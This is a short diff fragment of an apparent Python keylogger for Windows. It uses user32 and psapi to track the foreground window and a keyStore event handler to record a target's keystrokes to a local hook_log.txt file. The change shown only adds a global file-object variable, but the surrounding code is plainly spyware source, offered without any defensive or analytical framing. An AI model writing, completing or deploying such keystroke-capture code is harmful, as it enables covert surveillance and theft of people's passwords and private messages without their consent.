@@ -11,10 +11,10 @@ psapi = windll.psapi
 current_window = None
 
 file_name = "C:\\Users\\lenovo\\Documents\\hook_log.txt" 
-
+fobj = ''
 
 def get_current_process():
-
+    global fobj
     # 获取前台窗口句柄
     hwnd = user32.GetForegroundWindow()
 
@@ -46,7 +46,7 @@ def get_current_process():
 
 def keyStore(event):
     global current_window
-
+    global fobj
     # 检查目标是否切换了窗口
     if event.WindowName != current_window:
         current_window = event.WindowName
